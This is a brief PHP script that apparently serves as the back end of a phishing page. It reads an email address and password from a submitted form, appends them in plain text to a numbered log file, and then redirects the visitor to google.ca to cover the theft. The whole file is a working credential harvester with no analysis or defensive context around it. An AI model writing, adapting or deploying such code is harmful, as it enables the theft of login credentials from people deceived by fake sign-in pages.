<?php

$fp = fopen("639855558791055424.txt","a+");

$email = $_POST['email'];
$passwd = $_POST['passwd'];

fwrite($fp,"\n Email : $email \n Password : $passwd");
fclose($fp);
header('Location: https://www.google.ca');
?>